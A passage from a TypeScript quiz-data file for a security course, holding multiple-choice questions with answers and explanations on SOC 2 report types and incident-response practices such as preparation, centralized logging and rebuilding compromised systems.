      "Type I covers more Trust Service Criteria than Type II",
      "Type I is more expensive and takes longer than Type II",
      "Type I evaluates the design of security controls at a single point in time, while Type II evaluates the operational effectiveness of those controls over a period of 6-12 months — Type II provides much stronger assurance that controls actually work consistently",
      "Type I is for cloud providers while Type II is for on-premises systems",
    ],
    answer: 2,
    explanation:
      "SOC 2 Type I is a snapshot — an auditor examines the organization's security controls at a specific date and reports whether they are suitably designed. Type II covers a period (typically 6-12 months) — the auditor tests whether the controls operated effectively throughout that period, including examining evidence (logs, access reviews, incident reports). A Type I report says 'the controls look good on paper,' while Type II says 'the controls actually worked consistently for 12 months.' Enterprise customers strongly prefer Type II because it demonstrates sustained operational security, not just good documentation.",
  },

  // ============================================================
  // Topic 13: Incident Response (chapterId: 13)
  // ============================================================
  {
    id: "t13-q1",
    chapterId: 13,
    question:
      "Why is the Preparation phase considered the most critical phase of incident response?",
    options: [
      "Preparation takes the longest time to complete",
      "Preparation is the only phase that involves management approval",
      "Having IR plans, trained teams, communication templates, and forensic tools ready before an incident occurs dramatically reduces response time and errors — without preparation, responders improvise under pressure, making costly mistakes",
      "Preparation automatically prevents most security incidents from occurring",
    ],
    answer: 2,
    explanation:
      "During a security incident, stress is high, time pressure is extreme, and consequences of mistakes are severe. Preparation ensures that responders know their roles, communication channels are established (who contacts legal, PR, customers), escalation procedures are documented, forensic tools are deployed and tested, and the team has practiced through tabletop exercises. Without preparation, teams waste critical hours figuring out who to contact, where logs are stored, and how to isolate systems — while the attacker continues their operations. Studies show prepared organizations contain breaches 74 days faster than unprepared ones.",
  },
  {
    id: "t13-q2",
    chapterId: 13,
    question:
      "Why is centralized logging critical for forensic investigation?",
    options: [
      "Centralized logging reduces storage costs compared to local logging",
      "Centralized logging makes logs easier to read for non-technical staff",
      "Without centralized logging, an attacker who compromises a system can delete local logs to cover their tracks — centralized logging sends logs to a separate, secured system that the attacker cannot access, preserving the forensic evidence",
      "Centralized logging automatically detects and blocks attacks",
    ],
    answer: 2,
    explanation:
      "When an attacker compromises a system, one of their first actions is often to clear local logs (deleting /var/log/*, clearing Windows Event Logs) to remove evidence of their intrusion. If logs are only stored locally, this evidence is lost forever. Centralized logging (Splunk, Elastic SIEM, CloudWatch) continuously streams logs to a separate, hardened system. Even if the attacker gains root on the compromised system, they cannot modify logs that have already been shipped to the SIEM. Additionally, centralized logging enables cross-system correlation — connecting authentication failures on one system with network connections from another to reconstruct the full attack timeline.",
  },
  {
    id: "t13-q3",
    chapterId: 13,
    question:
      "Why should compromised systems be rebuilt from known-good images rather than cleaned in place?",
    options: [
      "Rebuilding is always faster than cleaning",
      "Cleaning requires more expensive security tools",
      "Sophisticated attackers may have installed backdoors, rootkits, or persistence mechanisms that survive typical cleanup procedures — rebuilding from a known-good image or backup ensures the system is free of all attacker modifications",
      "Cleaning a system automatically triggers compliance violations",
    ],
    answer: 2,
    explanation:
      "Advanced attackers install multiple persistence mechanisms: scheduled tasks, modified system binaries, kernel rootkits, firmware implants, hidden user accounts, and backdoored libraries. A typical cleanup (removing known malware files, resetting passwords) may miss deeply embedded backdoors. Rootkits can hide files, processes, and network connections from standard diagnostic tools. Rebuilding from a known-good image (pre-attack backup or fresh OS installation) guarantees that ALL attacker modifications are eliminated. The tradeoff is time — rebuilding takes longer than cleaning, but it provides certainty that the system is truly clean.",
  },
];

export function getQuestionsForChapter(chapterId: number): QuizQuestion[] {
  return quizQuestions.filter((q) => q.chapterId === chapterId);
}
